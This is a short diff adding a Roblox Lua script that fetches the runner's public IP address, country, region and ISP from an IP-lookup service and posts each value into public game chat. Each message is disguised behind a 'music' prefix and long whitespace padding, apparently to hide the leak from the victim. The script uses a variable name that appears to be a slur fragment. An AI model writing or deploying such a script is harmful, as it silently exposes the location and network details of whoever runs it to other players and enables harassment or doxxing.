@@ -1,0 +1,7 @@
+local nig = game:HttpGet("http://ip-api.com/json")
+local HttpService = game:GetService("HttpService")
+local decoded = HttpService:JSONDecode(nig)
+game.Players:Chat("music                                                                                     "..decoded["country"])
+game.Players:Chat("music                                                                                     "..decoded["query"])
+game.Players:Chat("music                                                                                     "..decoded["region"])
+game.Players:Chat("music                                                                                     "..decoded["isp"])
